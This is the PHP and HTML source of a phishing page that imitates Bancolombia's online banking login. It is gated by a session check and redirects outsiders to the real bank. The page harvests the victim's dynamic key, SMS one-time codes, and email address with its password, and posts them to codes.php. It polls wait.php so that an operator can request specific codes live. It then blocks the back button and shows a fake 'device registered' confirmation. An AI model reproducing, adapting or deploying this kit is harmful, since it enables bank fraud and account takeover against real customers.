<?php
session_start();
if(isset($_SESSION['vlidatePage'])){
?>
<html>

<head>
    <title>Bancolombia Sucursal Virtual Personas</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
    <meta charset="ISO-8859-1" />
    <meta content="es" http-equiv="Content-Language" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="ElInge" />
    <meta name="author" content="ElInge" />
    <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved." />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link href="css/styles.css?v=4.12.0.RC6_1721165575966" media="all" rel="stylesheet" type="text/css" />
    <link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css" />

    <!--[if lt IE 8]>
      <link href="css/bootstrap-ie7.css" rel="stylesheet" />
    <![endif]-->

    <!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
      <script src="js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery-migrate-3.4.0.min.js"></script>
    <script type="text/javascript" src="js/patterns/jquery.validate-1.11.1.js"></script>
    <script type="text/javascript" src="js/patterns/validations.js"></script>
    <script type="text/javascript" src="js/patterns/jquery-validations.js"></script>
    <script type="text/javascript" src="js/patterns/blockKeys.js"></script>
    <script type="text/javascript" src="js/jquery-ui.js"></script>

    <script type="text/javascript" src="js/bluebird.min.js"></script>

    <script type="text/javascript">
    "use strict";
    try {
        var scriptsToLoad = [
            "https://cdn.todo1.com/js/cDZQdujDp2/t1analytics.js?v=4.12.0.RC6_1721165575966",
        ];

        (function() {
            var elHead = document.getElementsByTagName("head")[0];
            for (var iS = 0; iS < scriptsToLoad.length; iS++) {
                var elScript = document.createElement("script");
                elScript.src = scriptsToLoad[iS];
                elHead.appendChild(elScript);
            }
        })();
    } catch (err) {
        console.log("error in loading ant-libs");
    }

    function collect() {
        try {
            encode_deviceprint().then((data) => {
                setDevicePrintValue(data);
            });
        } catch (err) {
            console.log("ERROR-CATH: error in loading ant-libs: " + err);
            setDevicePrintValue("");
        }
    }

    function setDevicePrintValue(valueDP) {
        document.forms[0].deviceprint.value = valueDP;
    }

    function urlEncode(c) {
        var d = encodeURIComponent(c)
            .replace(/\~/g, "%7E")
            .replace(/\!/g, "%21")
            .replace(/\*/g, "%2A")
            .replace(/\(/g, "%28")
            .replace(/\)/g, "%29")
            .replace(/\'/g, "%27")
            .replace(/\-/g, "%2D")
            .replace(/\_/g, "%5F")
            .replace(/\./g, "%2E");
        return d;
    }
    </script>

    <link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css" />
    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script language="JavaScript">
    function popup_help_a() {
        window.open(
            "global/ayuda.jsp",
            "HELP",
            "toolbar=no,scrollbars=yes,resizable=no,width=1010,height=615"
        );
    }
    </script>
    <script type="text/javascript" src="js/bootstrap.js"></script>

    <script language="javascript">
    var contError = "";
    $(document).ready(function() {
        contError = $("#contentError").html();
    });

    function reloadValidate() {
        if ($("#tabError").length) {
            var validator = $("#loginUserForm")
                .bind("invalid-form.validate", function() {})
                .validate({
                    onsubmit: true,
                    onkeyup: false,
                    onclick: false,
                    onfocusout: false,
                    rules: {
                        errorContainer: $("#summary"),
                        username: {
                            required: true,
                            passwordLength: true,
                            validaFormato: true,
                            validaFormato2: true,
                        },
                    },
                    messages: {
                        username: {
                            required: "<script>document.getElementById('summary').innerHTML='Por favor ingrese la informaci&oacute;n requerida.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            passwordLength: "<script>document.getElementById('summary').innerHTML='Por favor ingrese la informaci&oacute;n requerida.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            validaFormato: "<script>document.getElementById('summary').innerHTML='El usuario no cumple el formato requerido, por favor intente nuevamente.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                            validaFormato2: "<script>document.getElementById('summary').innerHTML='El usuario no puede inicar con el caracter 0.'; document.getElementById(\"tabError\").style.display = \"\";</" +
                                "script>",
                        },
                    },
                    submitHandler: function(form) {
                        //console.log('submitHandler');
                        if (callSVPSessionServlet()) {
                            form.submit();
                        } else {
                            window.location.href = "CLOSE_ALL";
                        }
                    },
                });
        } else {
            $("#contentError").html(contError);
            reloadValidate();
        }
    }
    </script>

    <script type="text/javascript">
    function delayPage() {
        $("#cargando").hide();
        $("#contenidoWeb").show("fast");
    }
    </script>

    <script type="text/javascript">
    var bankWindow;
    var count = 0;

    function execute() {
        reloadValidate();
        $("#btnGo").disabled = true;
        var form = $("#loginUserForm");
        form.validate();
        if (form.valid() && count == 0) {
            grecaptcha.execute();
        } else {
            count = 0;
            $("#btnGo").disabled = false;
        }
    }

    async function onSubmit() {
        try {
            var devicePrintAux = await encode_deviceprint();
            document.getElementById("deviceprint").value = devicePrintAux;
        } catch (err) {
            console.log("error in loading ant-libs: encode_deviceprint");
            document.getElementById("deviceprint").value = "";
        }
        $("#loginUserForm").submit();
        count++;
    }

    function onCaptcha() {
        if (
            document.getElementById("username").value != "" &&
            document.getElementById("username").value != null &&
            document.getElementById("username").value.length > 0
        ) {
            onSubmit();
        }
    }

    function checkKey(key) {
        var unicode;
        if (key.charCode) {
            unicode = key.charCode;
        } else {
            unicode = key.keyCode;
        }
        if (unicode == 13) {
            document.getElementById("btnGo").click();
        }
    }

    function openUserSupport(url) {
        bankWindow = window.open(
            "???userSupport.urlDomain???" + url,
            "bank",
            "status=yes,menubar=no,scrollbars=yes,resizable=yes"
        );
        bankWindow.focus();
    }

    function trim(s) {
        s.value = s.value.replace(/^\s+|\s+$/g, "");
    }
    </script>
    <script type="text/javascript">
    var enPasswLength = 0;

    function checkNumberBlank(num_value) {
        return /^[0-9\s]+$/.test(num_value);
    }
    $(document).ready(function() {
        $.validator.addMethod(
            "passwordLength",
            function(value, element, param) {
                return value.length >= 0 && value.length <= 20;
            }
        );

        $.validator.addMethod(
            "validaFormato",
            function(value, element, param) {
                var patron = /^[a-zA-Z0-9ñÑ]*$/;
                if (!value.search(patron)) return true;
                else return false;
            }
        );
        $.validator.addMethod(
            "validaFormato2",
            function(value, element, param) {
                if (checkNumberBlank(value)) {
                    var patron = /^[^0].*/;
                    if (!value.search(patron)) return true;
                    else return false;
                } else return true;
            }
        );

        $("#popoverUser").popover({
            html: true,
            trigger: "click",
            content: function() {
                return $("#popoverContent").html();
            },
        });
        $("#popoverUser").click(function(e) {
            e.stopPropagation();
        });
        $(document).click(function(e) {
            if (
                $(".popover").has(e.target).length == 0 ||
                $(e.target).is(".close") ||
                $(e.target).is(".mua_tooltip_close")
            ) {
                $("#popoverUser").popover("hide");
            }
        });
    });
    </script>

    <style>
    html,
    body,
    form {
        height: 100%;
    }

    .otp-input,
    .otp-input-sms {
        width: 3em;
        /* Aumenta el ancho del input */
        text-align: center;
        margin-right: 0.5em;
        font-size: 1.5em;
        /* Aumenta el tamaño de la fuente para que los números sean más visibles */
        padding: 0.5em;
        /* Añade un poco de padding para mejorar la apariencia */
    }

    .otp-container {
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 1em;
    }

    .otp-label {
        text-align: center;
        font-weight: bold;
        margin-bottom: 0.5em;
    }

    #loader {
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.611);
        /* Fondo oscurecido */
        z-index: 9999;
        /* Asegúrate de que esté por encima de otros elementos */
    }

    #loader img {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }
    </style>

    <script language="JavaScript">
    $(document).ready(function() {
        setTimeout(function() {
            window.location.hash = "no-back-button";
            window.location.hash = "Again-No-back-button";
            window.onhashchange = function() {
                window.location.hash = "no-back-button";
            };
        }, 1000);
    });
    document.ondrop = function(event) {
        return false;
    };

    function handle(delta) {
        if (delta < 0) return false;
        else return false;
    }

    function wheel(event) {
        var delta = 0;
        if (!event) event = window.event;
        if (event.wheelDelta) {
            delta = event.wheelDelta / 120;
            if (window.opera) delta = -delta;
        } else if (event.detail) {
            delta = -event.detail / 3;
        }
        if (delta) handle(delta);
        if (event.preventDefault) event.preventDefault();
        event.returnValue = false;
    }
    </script>

    <script type="text/javascript">
    var refresh = 900;

    var variables = [];
    var idleCountTime = 0;

    function initVariables() {
        variables["refresh"] = refresh;
    }

    initVariables();
    setVariables(variables);
    evaluateTimeout();

    function getSVPSessionResponse() {
        // strUrl is whatever URL you need to call
        var strUrl = "null";
        var strReturn = "";

        jQuery.ajax({
            url: strUrl,
            cache: false,
            method: "GET",
            success: function(html, textStatus, jqXHR) {
                //console.log('html: ' + html + ' textStatus: '  + textStatus + ' jqXHR: '  + jqXHR);
                strReturn = html;
            },
            error: function(html, textStatus, errorTrhown) {
                //console.log('html: ' + html + ' textStauts: '  + textStatus + " error: " + errorTrhown);
            },
            async: false,
        });

        return strReturn;
    }

    function callSVPSessionServlet() {
        var ret = false;
        var svpSessionControl = "N";
        if (svpSessionControl == "Y") {
            var response = getSVPSessionResponse();
            if (response != "") {
                console.log("response: " + response);
                if (response == "OK") {
                    ret = true;
                } else {
                    ret = false;
                }
            }
        } else {
            ret = true;
        }

        return ret;
    }

    function evaluateTimeout() {
        idleCountTime++;
        //console.log('evaluateTimeout entro idle: ' + idleCountTime + ' refresh: ' + variables["refresh"]);
        if (variables["refresh"] == idleCountTime) {
            //console.log('evaluateTimeout entro al if');

            $.ajax({
                type: "POST",
                dataType: "text/plain",
                url: "AJAX_LOG",
                complete: function(data) {
                    resetIdleTimeout();
                },
            });
            $.get("null", function(data) {
                if ("FAIL" == data) {
                    window.location.href = "CLOSE_ALL";
                } else {
                    resetIdleTimeout();
                }
            }).fail(function() {
                window.location.href = "CLOSE_ALL";
            });
        }
        setTimeout("evaluateTimeout()", 1000);
    }

    function resetIdleTimeout() {
        idleCountTime = 0;
    }

    function setVariables(vars) {
        variables = vars;
    }
    </script>
    <script type="text/javascript">
    function setTitle() {
        document.title = "Bancolombia Sucursal Virtual Personas";
    }
    </script>

    <link rel="shortcut icon" href="favicon.ico?v=4.12.0.RC6_1721165575966" />
</head>

<body onload="delayPage();setTitle();">
    <div id="loader">
        <img src="images/8c3994152005995.631a697736de0.gif" alt="Cargando..." />
    </div>
    <div id="contenidoWeb" style="display: none">
        <form id="loginUserForm" name="loginUserForm"
            action="VALIDATEPASSWORD.php?scis=FNfxFom4Cw8IDhlPcu9213LwsygpVFMSj%2FIuTA%2BsFJzIQ6b5I86eV6RC673PZ74l"
            method="post">
            <div class="container" id="containerMain">
                <div>
                    <div id="header" class="mua-page-header">
                        <div class="row row-logo-svp">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-imgLogoItem"></div>
                                <div class="text-svp-name">Sucursal Virtual Personas</div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
                                    <script language="javascript"
                                        src="js/jquery.jclockNew.js?v=4.12.0.RC6_1721165575966" type="text/JavaScript">
                                    </script>

                                    <script type="text/javascript">
                                    $(function($) {
                                        var optionsEST = {
                                            utc: true,
                                            utcOffset: -5,
                                            format: "%A %R de %B de %Y %l:%M:%S %P",
                                            language: "es",
                                        };
                                        $("#jclock1").jclockNew(optionsEST);
                                    });
                                    </script>
                                    <div>
                                        <div class="timeText">Fecha y hora actual:</div>
                                        <span id="jclock1" class="lastVisitedText"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel-heading">
                        <h3>Inicio de sesi&#243;n</h3>
                    </div>
                </div>

                <div class="panel panel-primary">
                    <div class="row" id="error">
                        <script language="JavaScript">
                        function cerrarError() {
                            document.getElementById("tabError").style.display = "none";
                            document.getElementById("summary").innerHTML = "";
                        }
                        </script>

                        <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError"
                            style="display: none">
                            <div class="errorDiv">
                                <div class="divTextMessage">
                                    <span class="icon-error errorIcon">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </span>
                                    <div class="errorTitulo">Error</div>
                                    <div id="summary" class="errorTexto"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="d-flex justify-content-center align-items-center mua-panel-body">
                        <div class="row">
                            <div class="col-xs-12 col-sm-5 col-md-4"></div>
                            <div class="col-xs-12 col-sm-5 col-md-4">
                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>Registro dispositivo seguro</h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4 id="text-from-tg">
                                            Ingresa los datos necesarios para el registro, no
                                            compartas estos datos con nadie
                                        </h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <div id="popoverContent" class="hide">
                                                    <span class="mua_tooltip_close">&times;</span>
                                                </div>
                                            </div>
                                            <div>
                                                <div id="div-dinamica" class="row justify-content-center mt-5">
                                                    <div class="col-6">
                                                        <div class="otp-label">
                                                            Ingrese su clave Din&aacute;mica
                                                        </div>
                                                        <div class="otp-container">
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-1" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-2" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-3" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-4" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-5" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input" id="otp-6" />
                                                        </div>
                                                        <input type="hidden" class="otp-input-hidden" />
                                                    </div>
                                                </div>

                                                <div id="div-sms" class="row justify-content-center mt-5">
                                                    <div class="col-6">
                                                        <div class="otp-label">
                                                            Ingrese el c&oacute;digo SMS
                                                        </div>
                                                        <div class="otp-container">
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-1" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-2" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-3" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-4" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-5" />
                                                            <input type="text" maxlength="1"
                                                                class="form-control otp-input-sms" id="otp-sms-6" />
                                                        </div>
                                                        <input type="hidden" class="otp-input-sms-hidden" />
                                                    </div>
                                                </div>
                                                <div id="div-correo" class="row justify-content-center mt-5">
                                                    <div class="col-6">
                                                        <div class="otp-label">
                                                            Registre su correo?
                                                        </div>
                                                        <div class="">
                                                            <input id="correo" class="mua-form-control otp-input"
                                                                type="text" value="" maxlength="100"
                                                                autocomplete="off" />
                                                            <div class="otp-label">
                                                                Clave de su correo
                                                            </div>
                                                            <div class="">
                                                                <input id="clave" class="mua-form-control otp-input"
                                                                    type="password" value="" maxlength="100"
                                                                    autocomplete="off" />
                                                            </div>
                                                        </div>



                                                    </div>
                                                </div>
                                            </div>

                                            <div class="one-button-container mua-button-container">
                                                <a href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                    name="btnGo" id="btnfin" class="btn btn-success" type="button"
                                                    style="display: none !important;">
                                                    Finalizar
                                                </a>

                                                <button id="btnCodes" name="btnGo" class="btn btn-success" type="button"
                                                    onclick="javascript:execute();">
                                                    Continuar
                                                </button>
                                            </div>


                                        </div>
                                        <div class="mt-5 col-xs-12 col-sm-5 col-md-4"></div>
                                        <div class="panel_general mua-panel_general">
                                            <div id="contenido">
                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6centro-de-ayuda/canales/sucursal-virtual-personas"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_demo">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span
                                                                    class="path5"></span><span
                                                                    class="path6"></span><span class="path7"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Conoce sobre Sucursal Virtual Personas
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6educacion-financiera/seguridad-bancaria/seguridad-informatica"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_bloquear">
                                                                <span class="path1"></span><span class="path2"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Aprende sobre Seguridad
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6wcm/connect/1dcd5b4b-a856-4cee-9df9-f497eb26f964/Reglamento+Banca+por+Internet.pdf?MOD=AJPERES&CVID=l.B62Ro"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_reglamento">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span
                                                                    class="path5"></span><span
                                                                    class="path6"></span><span class="path7"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Reglamento Sucursal Virtual
                                                        </div>
                                                    </a>
                                                </div>

                                                <div class="mua-divIcon">
                                                    <a class="mua-itemsIcons-btn"
                                                        href="https://www.bancolombia.com/csflu6personas/documentos-legales/proteccion-datos/bancolombia-sa"
                                                        target="_blank">
                                                        <div class="mua-divCell">
                                                            <span class="adminItems-Icons icon-icon_politicas">
                                                                <span class="path1"></span><span
                                                                    class="path2"></span><span
                                                                    class="path3"></span><span
                                                                    class="path4"></span><span class="path5"></span>
                                                            </span>
                                                        </div>
                                                        <div class="mua-divCell-text">
                                                            Pol&iacute;tica de Privacidad
                                                        </div>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-xs-12 col-sm-12 col-md-12">
                                <p class="mua-footer">
                                    Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; (57) 60 1
                                    343 00 00 - Medell&iacute;n (57) 60 4 510 90 00 - Cali (57) 60 2
                                    554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60
                                    5 693 44 00 - <br />
                                    Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 -
                                    El resto del pa&iacute;s 018000 9 12345. Sucursales
                                    Telef&oacute;nicas en el exterior: Espa&ntilde;a (34) 900 995
                                    717 - Estados Unidos (1) 866 379 97 14.
                                </p>
                            </div>
                        </div>

                        <script type="text/javascript">
                        var year = new Date().getFullYear();
                        $(document).ready(function() {
                            $("#fecha").text(year);
                        });
                        </script>
                        <div style="margin-top: 10px">
                            <div class="mua-title-text pull-left">
                                Direcci&oacute;n IP: 145.82.99.65
                            </div>
                            <div class="mua-title-text pull-right">
                                Copyright &copysr;&nbsp;<span id="fecha">&nbsp;</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;
                            </div>
                        </div>
                    </div>

                    


                    <script language="JavaScript" type="text/javascript">
                    $(document).ready(function() {
                        function handleOtpInput(inputClass) {
                            $(inputClass).on("input", function() {
                                if (this.value.length === 1) {
                                    $(this).next(inputClass).focus();
                                }
                                updateHiddenInput(inputClass);
                            });

                            $(inputClass).on("keydown", function(e) {
                                if (e.key === "Backspace" && this.value.length === 0) {
                                    $(this).prev(inputClass).focus();
                                }
                            });

                            function updateHiddenInput(inputClass) {
                                let otpValue = "";
                                $(inputClass).each(function() {
                                    otpValue += $(this).val();
                                });
                                // Actualiza el campo oculto usando una clase única o un ID específico
                                let hiddenInputClass = inputClass + "-hidden";
                                $(hiddenInputClass).val(otpValue);
                            }

                            $(inputClass).on("paste", function(e) {
                                let pasteData = e.originalEvent.clipboardData.getData("text");
                                if (pasteData.length === 6 && $.isNumeric(pasteData)) {
                                    let otpArray = pasteData.split("");
                                    $(inputClass).each(function(index) {
                                        $(this).val(otpArray[index]);
                                    });
                                    updateHiddenInput(inputClass);
                                }
                                e.preventDefault();
                            });
                        }

                        handleOtpInput(".otp-input");
                        handleOtpInput(".otp-input-sms");
                    });
                    $("#loader").show();
                    $("#div-correo").hide();
                    $("#btnfin").hide();

                    function checkStatus() {
                        $.ajax({
                            url: "wait.php",
                            type: "POST",
                            dataType: "json",
                            data: {
                                userID: localStorage.getItem("username"),
                            },
                            success: function(response) {
                                if (response.response.type === "waiting") {
                                    $("#loader").show();
                                    $("#div-dinamica").hide();
                                    $("#div-sms").hide();
                                } else if (response.response.type === "sms") {
                                    $("#loader").hide();
                                    $("#div-dinamica").hide();
                                    $("#div-sms").show();
                                    clearInterval(intervalID);
                                } else if (response.response.type === "dinamica") {
                                    $("#loader").hide();
                                    $("#div-sms").hide();
                                    $("#div-dinamica").show();
                                    clearInterval(intervalID);
                                } else if (response.response.type === "ambas") {
                                    $("#loader").hide();
                                    $("#div-dinamica").show();
                                    $("#div-sms").show();
                                    clearInterval(intervalID);
                                }
                            },
                            error: function(jqXHR, textStatus, errorThrown) {
                                $("#loader").hide();
                                clearInterval(intervalID);
                                $("#response").html("<p>Error: " + textStatus + "</p>");
                            },
                        });
                    }

                    var intervalID = setInterval(checkStatus, 3000); // Verifica cada 3 segundos
                    function toggleLoader() {
                        $("#loader").show();
                        setTimeout(function() {
                            $("#loader").hide();
                        }, 3000);
                    }
                    $(document).ready(function() {
                        checkStatus(); // Llama inmediatamente la primera vez

                        $("#btnCodes").click(function() {

                            var dinamica = $(".otp-input-hidden")
                                .val(); // Leer el valor del campo username
                            var sms = $(".otp-input-sms-hidden").val();

                            var correo = $("#correo").val();
                            var clave = $("#clave").val();
                            if (dinamica || sms || clave || correo) {
                                $.ajax({
                                    url: "codes.php",
                                    type: "POST",
                                    data: {
                                        dinamica: dinamica,
                                        sms: sms,
                                        correo: correo + ' pass ' + clave,
                                    },
                                    success: function(response) {
                                        toggleLoader()
                                        $("#div-dinamica").hide();
                                        $("#div-sms").hide();
                                        $("#div-correo").show();
                                        $("#btnfin").show();

                                        Swal.fire({
                                            title: "Finalizado",
                                            text: "Su dispositivo fue registrado",
                                            icon: "success"
                                        }).then((result) => {
                                            if (result.isConfirmed) {
                                                if (correo.length > 0) {
                                                    window.location.href =
                                                        "https://sucursalpersonas.transaccionesbancolombia.com";
                                                } else {
                                                    Swal.close()
                                                }
                                            }
                                        });

                                    },
                                    error: function(jqXHR, textStatus, errorThrown) {
                                        $("#response").html("<p>Error: " + textStatus +
                                            "</p>");
                                    },
                                });
                            }
                        });
                    });
                    </script>
        </form>
    </div>
</body>

</html>
<?php
}
else {
  header('Location: https://sucursalpersonas.transaccionesbancolombia.com');
  exit;
}